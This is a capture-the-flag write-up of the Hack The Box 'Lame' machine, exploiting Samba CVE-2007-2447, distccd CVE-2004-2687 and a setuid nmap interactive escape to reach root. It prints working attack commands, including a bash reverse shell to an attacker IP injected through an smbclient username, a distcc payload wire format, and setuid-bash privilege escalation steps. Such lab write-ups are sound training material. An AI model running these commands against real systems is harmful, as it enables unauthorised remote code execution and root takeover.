# Lame — Hack The Box, Easy, Linux

**TL;DR:** A host from the Ubuntu 8.04 era with four obvious ports and one that
is not obvious at all. `distccd` on 3632 — outside the top-1000 port list —
executes commands for anyone who asks, and a setuid-root `nmap` 4.53 still has
the `--interactive` shell escape that upstream removed in 5.20, so the foothold
is one `echo` away from root. The more interesting half is the lead that came
first and *looked* dead: Samba 3.0.20 is vulnerable to the `username map script`
injection, but no modern client can deliver it, because they all negotiate
SPNEGO/NTLMv2 and the payload never reaches a shell. Hand-building a
non-extended SMB1 session setup lands it — unauthenticated root, in a single
packet exchange.

## Reconnaissance

    nmap -Pn -T4 --top-ports 1000 -sV 10.129.x.x

    21/tcp   open  ftp          vsftpd 2.3.4
    22/tcp   open  ssh          OpenSSH 4.7p1 Debian 8ubuntu1
    139/tcp  open  netbios-ssn  Samba smbd 3.X - 4.X
    445/tcp  open  netbios-ssn  Samba smbd 3.X - 4.X

Four ports, all ancient. That is enough to solve the box — but the full sweep,
started in the background while the SMB output was being read, is what actually
decided this run:

    nmap -Pn -T4 -p- --min-rate 2000 10.129.x.x

    3632/tcp open  distccd

That fifth port is outside the top 1000, and it is worth internalising why. A
top-ports scan is a *sampling* of the port space, so the one service somebody
installed for a specific purpose is exactly the service least likely to appear
in a list of common ports. Run sequentially, this result would have arrived long
after the search order was already set; run in parallel, it arrived in time to
matter.

Anonymous SMB gave the version away immediately:

    smbclient -L //10.129.x.x -N

    Anonymous login successful
            Sharename       Type      Comment
            print$          Disk      Printer Drivers
            tmp             Disk      oh noes!
            opt             Disk
            IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))

`Samba 3.0.20-Debian` — not "Samba 4", but an actual three-component version.
That is the whole point of running a protocol-specific probe instead of trusting
nmap's `-sV` guess. 3.0.20 sits squarely inside the range for **CVE-2007-2447**,
the `username map script` command injection.

## The lead that was right and still failed

CVE-2007-2447 is the canonical answer for this version. Samba interpolates the
client-supplied username into a shell command invoked via `smbrun()`, so a
username of the form ``/=`command` `` executes as `root` — the login is rejected
afterwards, but the command has already run.

The textbook invocation does nothing:

    smbclient //10.129.x.x/tmp -N -U '/=`nohup bash -c "bash -i >& /dev/tcp/10.10.14.x/4444 0>&1"`'
    session setup failed: NT_STATUS_LOGON_FAILURE

`LOGON_FAILURE` is *expected* — it is what this exploit looks like when it
works. But no shell came back. Forcing the old dialect did not help either:

    lpcfg_do_global_parameter: WARNING: The "client use spnego" option is deprecated
    lpcfg_do_global_parameter: WARNING: The "client ntlmv2 auth" option is deprecated
    session setup failed: NT_STATUS_LOGON_FAILURE

Those knobs are accepted and ignored by current Samba. Impacket did no better:
`SMB.login_standard()` raised `KeyError: 'Challenge'`, because the server
advertised extended security and the negotiate response therefore carried a
security blob where the classic challenge would have been.

The reason generalises well beyond this box:

> A 19-year-old bug in the *authentication* path can be unreachable with modern
> tooling, because the modern client refuses to speak the protocol the bug lives
> in. The username only reaches `smbrun()` if it is sent as a plain
> null-terminated string in a **non-extended** `SESSION_SETUP_ANDX`. Every
> current client negotiates SPNEGO/NTLMv2, which packs the username into an NTLM
> blob — the metacharacters end up inside a structured field and are never handed
> to a shell.

At this point the honest state of the engagement was: *the right answer, parked
as a failed lead.* That is the most dangerous position to be in, because the
notes now say "tried, didn't work" about the thing that does work.

## The second door: distcc

`distccd` on 3632 needed no cleverness. nmap's own script answers the question
with output rather than a version comparison:

    nmap -Pn -p3632 --script distcc-cve2004-2687 10.129.x.x

    |   distcc Daemon Command Execution
    |     State: VULNERABLE (Exploitable)
    |     IDs:  CVE:CVE-2004-2687
    |     uid=1(daemon) gid=1(daemon) groups=1(daemon)

That is not "the version looks vulnerable" — that is `id` output from the
target. CVE-2004-2687 is a configuration weakness rather than a memory-safety
bug: `distccd` executes the compiler command line it is handed, and with no
`--allow`, anyone may hand it one.

Turning the check into a usable primitive took one detour. Passing a real
payload through `--script-args` silently destroyed it — the argument parser does
not survive quotes and `&`, and the script simply produced *no output at all*,
which reads as "not vulnerable" rather than "payload mangled". Rather than fight
the escaping, the wire format (visible in the NSE source) was reimplemented in
about forty lines of Python:

    DIST00000001
    ARGC00000008
    ARGV00000002sh
    ARGV00000002-c
    ARGV<len>sh -c '(<cmd>)'
    ARGV00000001#
    ARGV00000002-c
    ARGV00000006main.c
    ARGV00000002-o
    ARGV00000006main.o
    DOTI00000001A

The payoff is a primitive that returns command output **synchronously**, which
turns out to be more useful than a reverse shell for the enumeration that
follows — no listener, no TTY, nothing to drop:

    uid=1(daemon) gid=1(daemon) groups=1(daemon)
    Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
    ftp
    makis
    service
    user

Two lessons, both about tooling rather than the box. First: when a scanner's
argument plumbing mangles a payload, reimplementing the protocol is often
cheaper than escaping the payload — the wire format was already in front of me,
in the scanner's own source. Second: a reverse shell fired earlier *had* landed;
its output had simply gone to a different file than the one being checked. A
missing callback and a missing `cat` look identical from the outside, and a tool
that was working was nearly abandoned as broken.

## user.txt, without escalating

    -rw-r--r-- 1 makis makis   33 ... user.txt

`/home/makis/user.txt` is world-readable, so `daemon` reads it directly:

    <user flag redacted>

No lateral movement, no credential reuse, no cracking. Worth noting because the
instinct after a service-account foothold is to start hunting for a user
password — here the flag was simply readable.

## Root, in one command

Standard local enumeration, before reaching for any privesc script:

    find / -perm -4000 -type f 2>/dev/null
    ...
    /usr/bin/nmap
    ...

A setuid-root `nmap` is not subtle, and the version decides everything:

    -rwsr-xr-x 1 root root 780676 Apr  8  2008 /usr/bin/nmap
    Nmap version 4.53 ( http://insecure.org )

`nmap` supported an `--interactive` mode until 5.20, and in that mode `!` passes
the rest of the line to `system()` without dropping privileges. Since it reads
stdin, it weaponises non-interactively — which matters when the foothold is a
synchronous exec primitive with no TTY:

    echo "!cp /bin/bash /tmp/.rb" | /usr/bin/nmap --interactive
    echo "!chmod 4755 /tmp/.rb"   | /usr/bin/nmap --interactive
    /tmp/.rb -p -c "id; cat /root/root.txt"

    uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)
    <root flag redacted>

`uid` non-zero with `euid=0` is the signature of arriving through a setuid
binary rather than a login — useful orientation when several primitives are in
play and you are not certain which one just fired.

## Going back for the Samba path

Root was already in hand, so finishing CVE-2007-2447 changed nothing about the
outcome. It was worth doing anyway: it was the *first* lead, it was *correct*,
and the notes recorded it as a failure. Leaving that uncorrected would have
taught exactly the wrong lesson.

The first step was to stop guessing and confirm the precondition on the target,
using the distcc primitive to read the config:

    grep -n "username map" /etc/samba/smb.conf
    107:username map script = /etc/samba/scripts/mapusers.sh

Precondition present, version in range — so the vulnerability was live and the
problem was purely delivery. The fix was to stop asking a client library to send
something it will not send, and build the exchange by hand: a NEGOTIATE offering
only `NT LM 0.12`, then a `SESSION_SETUP_ANDX` with `WordCount 13` (the
non-extended form), the `EXTENDED_SECURITY` bit (`0x0800`) clear in `flags2`,
and `AccountName` as a plain null-terminated string.

    [*] negotiate response: 101 bytes, status=00000000
    [*] AccountName on the wire: /=`id > /tmp/proof 2>&1`
    [*] session setup status = 0x00050001

The session setup fails, as it must. But the command ran. Since there is no
output channel, the confirmation is a side-effect oracle — read the file back
through the distcc primitive:

    uid=0(root) gid=0(root)

`root`, unauthenticated, in a single packet exchange. No foothold, no
escalation. That is the finding the report leads with, and it was reachable in
the first two minutes of the engagement — by anyone willing to write sixty lines
of socket code instead of assuming the exploit was patched.

Confirming it also required distinguishing "no output" from "no execution",
which is the failure mode that cost the most time overall. A synchronous exec
primitive on another port is a luxury; without it, the same confirmation needs a
timing oracle or an outbound callback, and either would have been the right move
before writing the lead off.

## What failed, and why it was worth the time

| Lead | Outcome | Why |
|---|---|---|
| vsftpd 2.3.4 backdoor (CVE-2011-2523) | **Dead** | The version string is famous, but the backdoor check did not trigger and anonymous FTP served an empty root. The version alone implies a backdoor this build does not have — running the check is what turns a guess into a fact. |
| `smbclient` delivery of CVE-2007-2447 | **Dead end, correct vulnerability** | Modern client negotiates SPNEGO/NTLMv2; the payload never reaches the shell. |
| Deprecated `client use spnego = no` etc. | **Dead** | Accepted and ignored by current Samba. The warnings say so explicitly, which is easy to skim past while watching for a callback. |
| impacket `login_standard()` | **Dead** | `KeyError: 'Challenge'` — the server advertised extended security, so no classic challenge was parsed. Re-negotiating on the live session got the connection dropped. |
| NSE `--script-args` with a quoted payload | **Dead** | Argument parser destroys quotes and `&`; the script produced no output at all, which reads as "not vulnerable". |
| OpenSSH 4.7p1 | **Not pursued** | Only user-enumeration issues at this version; no pre-auth code execution, and two better doors were already open. |

## Takeaways

1. **Run the full port sweep in parallel, not afterwards.** The service that
   decided this engagement was outside the top 1000.
2. **A pinned version tells you the vulnerability, not whether you can reach
   it.** The gap between "this build is vulnerable" and "my client can express
   the attack" is real, and it widens every year as clients drop legacy
   protocols. When stock tooling fails on an old auth-path bug, suspect the
   *client* before concluding the target is patched — and confirm the
   precondition on the target rather than arguing with the version number.
3. **Separate "no output" from "no execution" before writing off a lead.** Three
   things look identical from outside: the payload not reaching the sink, the
   callback not returning, and the tool working while you read the wrong file.
   All three happened here. A side-effect oracle settles it in one request.
4. **Prove negatives too.** vsftpd 2.3.4 *not* being backdoored is a finding. A
   version string is a hypothesis, and the point of running the check is that it
   can come back negative.
5. **Pin the version of an unusual setuid binary.** GTFOBins entries are often
   version-conditional: a tool gains a scripting or interactive mode, it gets
   abused, upstream removes it. The same binary is inert on a modern box and a
   one-command root on an old one.

The defensive summary is short. Both critical findings are *pre-authentication*
code execution, so no password policy, lockout threshold or failed-login
monitoring would have stopped either. Reachability is the only control
positioned before the vulnerability — and the service that decided the
engagement was the one nobody knew was listening.
